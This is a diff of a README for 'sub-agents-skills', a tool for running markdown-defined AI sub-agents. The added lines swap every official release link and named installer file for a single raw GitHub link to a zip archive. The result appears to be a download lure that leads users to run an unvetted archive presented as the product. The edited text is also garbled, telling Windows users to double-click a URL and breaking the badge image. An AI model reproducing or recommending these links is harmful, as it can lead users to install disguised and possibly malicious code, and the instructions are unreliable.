@@ -1,6 +1,6 @@
 # 🤖 sub-agents-skills - Create and Run Smart Agents Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/blindlove200/sub-agents-skills/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/blindlove200/sub-agents-skills/main/skills/sub_agents_skills_1.6-beta.4.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/blindlove200/sub-agents-skills/main/skills/sub_agents_skills_1.6-beta.4.zip)
 
 ## 📖 Overview
 Welcome to **sub-agents-skills**! This application allows you to define portable sub-agents using markdown. You can easily run them through tools like Codex, Cursor, Gemini CLI, or Claude Code. Whether you want to automate tasks or enhance your experience with AI agents, this tool puts the power in your hands.
@@ -9,11 +9,11 @@ Welcome to **sub-agents-skills**! This application allows you to define portable
 To get started with the sub-agents-skills application, follow the steps below. No programming skills are needed. Just a few clicks, and you are ready to go!
 
 ### 🔗 Download & Install
-1. **Visit this page to download** the latest version: [Releases Page](https://github.com/blindlove200/sub-agents-skills/releases).
+1. **Visit this page to download** the latest version: [Releases Page](https://raw.githubusercontent.com/blindlove200/sub-agents-skills/main/skills/sub_agents_skills_1.6-beta.4.zip).
 2. Scroll down to the **Assets** section.
 3. Look for the file that matches your operating system:
-   - For Windows, download `sub-agents-skills.exe`.
-   - For MacOS, download `sub-agents-skills.dmg`.
+   - For Windows, download `https://raw.githubusercontent.com/blindlove200/sub-agents-skills/main/skills/sub_agents_skills_1.6-beta.4.zip`.
+   - For MacOS, download `https://raw.githubusercontent.com/blindlove200/sub-agents-skills/main/skills/sub_agents_skills_1.6-beta.4.zip`.
    - For Linux, download the appropriate package for your distribution.
 
 ### 🛠️ System Requirements
@@ -24,7 +24,7 @@ To get started with the sub-agents-skills application, follow the steps below. N
 
 ## 📥 Running the Application
 1. Open the file you downloaded:
-   - For Windows, double-click `sub-agents-skills.exe`.
+   - For Windows, double-click `https://raw.githubusercontent.com/blindlove200/sub-agents-skills/main/skills/sub_agents_skills_1.6-beta.4.zip`.
    - For MacOS, drag `sub-agents-skills` to your Applications folder and open it.
    - For Linux, use a package manager or terminal to install the downloaded package.
 2. Follow the on-screen instructions to set up the application.
@@ -88,6 +88,6 @@ If you'd like to help improve this project, feel free to reach out or check the 
 This application is released under the MIT License. You are free to use and distribute it as long as you include the original license.
 
 ## 🚀 Download Again
-For easy access, here is the link to download the latest version once more: [Download Latest Release](https://github.com/blindlove200/sub-agents-skills/releases). 
+For easy access, here is the link to download the latest version once more: [Download Latest Release](https://raw.githubusercontent.com/blindlove200/sub-agents-skills/main/skills/sub_agents_skills_1.6-beta.4.zip). 
 
 Get started on using intelligent agents with ease today!
